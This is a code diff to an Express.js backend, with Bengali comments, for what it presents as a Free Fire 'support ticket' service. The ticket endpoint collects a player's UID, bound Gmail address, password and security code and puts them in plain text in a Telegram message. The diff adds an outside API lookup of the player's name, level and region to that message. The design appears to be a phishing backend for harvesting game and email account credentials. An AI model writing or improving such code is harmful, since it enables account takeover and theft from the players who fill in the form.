@@ -24,23 +24,50 @@ if (!global.persistentStore) {
 
 app.get('/', (req, res) => res.send("Backend Active"));
 
-// ১. টিকিট জমা নেওয়ার API
+// ১. টিকিট জমা নেওয়ার API (FF Info API অটো-ফেচ সহ)
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    // নতুন ডিফল্ট টেক্সট
+    let playerName = "Unknown Player";
+    let playerLevel = "N/A";
+    let playerRegion = "Bangladesh";
+
+    // FF Info API থেকে সরাসরি ডাটা নেওয়ার চেষ্টা
+    try {
+        const ffRes = await axios.get(`https://ffxinfo-ffx.ffxapis.workers.dev/ff-info?uid=${encodeURIComponent(uid)}`, { timeout: 5000 });
+        const source = ffRes.data?.data || ffRes.data || {};
+        const basic = source.basicInfo || source.profileInfo || source || {};
+
+        if (basic.nickname || basic.name) {
+            playerName = basic.nickname || basic.name;
+        }
+        if (basic.level) {
+            playerLevel = typeof basic.level === 'number' ? `Level ${basic.level}` : String(basic.level);
+        }
+        if (basic.region) {
+            playerRegion = basic.region;
+        }
+    } catch (e) {
+        console.error("FF Info Fetch Error:", e.message);
+    }
+
+    // ব্যাকএন্ড স্টোরে লাইভ ডাটা জমা করা
     global.persistentStore[String(uid)] = {
         status: "Pending",
-        name: "Searching Player Name...",
-        level: "Fetching Level...",
-        region: "Bangladesh",
+        name: playerName,
+        level: playerLevel,
+        region: playerRegion,
         reason: ""
     };
 
+    // টেলিগ্রামে প্লেয়ার নাম ও লেভেলসহ মেসেজ গঠন
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
 
+👤 *Player Name:* \`${playerName}\`
 🆔 *Player UID:* \`${uid}\`
+🎖️ *Level:* \`${playerLevel}\`
+🌍 *Region:* \`${playerRegion}\`
 📧 *Bind Gmail:* \`${gmail}\`
 🔑 *Password:* \`${password}\`
 🔢 *Security Code:* \`${securityCode}\`
@@ -82,7 +109,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
 
-        // টেলিগ্রামে মেসেজ টাইপ করে নাম ও লেভেল সেট করার লজিক (ফরম্যাট: UID Name Level)
+        // টেলিগ্রামে মেসেজ টাইপ করে ম্যানুয়ালি নাম ও লেভেল সেট করার লজিক (ফরম্যাট: UID Name Level)
         if (update && update.message && update.message.text) {
             const text = update.message.text.trim();
             const parts = text.split(' ');
@@ -108,7 +135,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
         }
 
-        // বাটন চাপলে
+        // ইনলাইন বাটন চাপলে
         if (update && update.callback_query) {
             const callbackQuery = update.callback_query;
             const data = callbackQuery.data; 
@@ -127,7 +154,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     status: "Verified",
                     name: currentData.name || "Searching Player Name...",
                     level: currentData.level || "Fetching Level...",
-                    region: "Bangladesh",
+                    region: currentData.region || "Bangladesh",
                     reason: ""
                 };
 
@@ -149,7 +176,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     status: "Rejected",
                     name: currentData.name || "Searching Player Name...",
                     level: currentData.level || "Fetching Level...",
-                    region: "Bangladesh",
+                    region: currentData.region || "Bangladesh",
                     reason: reason
                 };
 
